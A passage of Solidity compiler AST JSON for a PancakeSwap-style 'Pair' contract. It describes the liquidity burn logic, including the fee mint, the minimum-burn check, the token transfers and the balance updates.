														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 23,
														"src": "8454:9:6",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 1742,
													"indexExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 1740,
																"name": "this",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2386,
																"src": "8472:4:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Pair_$2224",
																	"typeString": "contract Pair"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_Pair_$2224",
																	"typeString": "contract Pair"
																}
															],
															"id": 1739,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "8464:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": "address"
														},
														"id": 1741,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "8464:13:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "8454:24:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8437:41:6"
											},
											{
												"assignments": [
													1745
												],
												"declarations": [
													{
														"constant": false,
														"id": 1745,
														"name": "feeOn",
														"nodeType": "VariableDeclaration",
														"scope": 1851,
														"src": "8489:10:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1744,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "8489:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1750,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1747,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1700,
															"src": "8511:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1748,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1702,
															"src": "8522:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1746,
														"name": "_mintFee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1398,
														"src": "8502:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint112_$_t_uint112_$returns$_t_bool_$",
															"typeString": "function (uint112,uint112) returns (bool)"
														}
													},
													"id": 1749,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8502:30:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8489:43:6"
											},
											{
												"assignments": [
													1752
												],
												"declarations": [
													{
														"constant": false,
														"id": 1752,
														"name": "_totalSupply",
														"nodeType": "VariableDeclaration",
														"scope": 1851,
														"src": "8542:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1751,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "8542:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1754,
												"initialValue": {
													"argumentTypes": null,
													"id": 1753,
													"name": "totalSupply",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 19,
													"src": "8562:11:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8542:31:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1762,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1755,
														"name": "amount0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1695,
														"src": "8661:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1761,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1758,
																	"name": "balance0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1715,
																	"src": "8685:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 1756,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1737,
																	"src": "8671:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1757,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2298,
																"src": "8671:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1759,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8671:23:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"id": 1760,
															"name": "_totalSupply",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1752,
															"src": "8697:12:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "8671:38:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "8661:48:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1763,
												"nodeType": "ExpressionStatement",
												"src": "8661:48:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1771,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1764,
														"name": "amount1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1697,
														"src": "8767:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1770,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1767,
																	"name": "balance1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1726,
																	"src": "8791:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 1765,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1737,
																	"src": "8777:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1766,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2298,
																"src": "8777:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1768,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8777:23:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"id": 1769,
															"name": "_totalSupply",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1752,
															"src": "8803:12:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "8777:38:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "8767:48:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1772,
												"nodeType": "ExpressionStatement",
												"src": "8767:48:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1780,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1776,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1774,
																	"name": "amount0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1695,
																	"src": "8894:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1775,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8904:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "8894:11:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1779,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1777,
																	"name": "amount1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1697,
																	"src": "8909:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1778,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8919:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "8909:11:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "8894:26:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544",
															"id": 1781,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8934:40:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_BURNED\""
															},
															"value": "Pancake: INSUFFICIENT_LIQUIDITY_BURNED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_BURNED\""
															}
														],
														"id": 1773,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "8873:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1782,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8873:111:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1783,
												"nodeType": "ExpressionStatement",
												"src": "8873:111:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1786,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2386,
																	"src": "9008:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1785,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "9000:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1787,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "9000:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1788,
															"name": "liquidity",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1737,
															"src": "9015:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1784,
														"name": "_burn",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 206,
														"src": "8994:5:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256)"
														}
													},
													"id": 1789,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8994:31:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1790,
												"nodeType": "ExpressionStatement",
												"src": "8994:31:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1792,
															"name": "_token0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1707,
															"src": "9049:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1793,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1690,
															"src": "9058:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1794,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1695,
															"src": "9062:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1791,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1096,
														"src": "9035:13:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 1795,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9035:35:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1796,
												"nodeType": "ExpressionStatement",
												"src": "9035:35:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1798,
															"name": "_token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1711,
															"src": "9094:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1799,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1690,
															"src": "9103:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1800,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1697,
															"src": "9107:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1797,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1096,
														"src": "9080:13:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 1801,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9080:35:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1802,
												"nodeType": "ExpressionStatement",
												"src": "9080:35:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1812,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1803,
														"name": "balance0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1715,
														"src": "9125:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1809,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2386,
																		"src": "9170:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_Pair_$2224",
																			"typeString": "contract Pair"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_Pair_$2224",
																			"typeString": "contract Pair"
																		}
																	],
																	"id": 1808,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "9162:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 1810,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "9162:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1805,
																		"name": "_token0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1707,
																		"src": "9143:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"id": 1804,
																	"name": "IERC20",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 533,
																	"src": "9136:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																		"typeString": "type(contract IERC20)"
																	}
																},
																"id": 1806,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "9136:15:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_IERC20_$533",
																	"typeString": "contract IERC20"
																}
															},
															"id": 1807,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balanceOf",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 494,
															"src": "9136:25:6",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																"typeString": "function (address) view external returns (uint256)"
															}
														},
														"id": 1811,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "9136:40:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "9125:51:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1813,
												"nodeType": "ExpressionStatement",
												"src": "9125:51:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1823,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1814,
														"name": "balance1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1726,
														"src": "9186:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1820,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2386,
																		"src": "9231:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_Pair_$2224",
																			"typeString": "contract Pair"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_Pair_$2224",
																			"typeString": "contract Pair"
																		}
																	],
																	"id": 1819,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "9223:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 1821,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "9223:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1816,
																		"name": "_token1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1711,
																		"src": "9204:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"id": 1815,
																	"name": "IERC20",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 533,
																	"src": "9197:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																		"typeString": "type(contract IERC20)"
																	}
																},
																"id": 1817,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "9197:15:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_IERC20_$533",
																	"typeString": "contract IERC20"
																}
															},
															"id": 1818,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balanceOf",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 494,
															"src": "9197:25:6",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																"typeString": "function (address) view external returns (uint256)"
															}
														},
														"id": 1822,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "9197:40:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "9186:51:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1824,
												"nodeType": "ExpressionStatement",
												"src": "9186:51:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1826,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1715,
															"src": "9256:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1827,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1726,
															"src": "9266:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1828,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1700,
															"src": "9276:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1829,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1702,
															"src": "9287:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
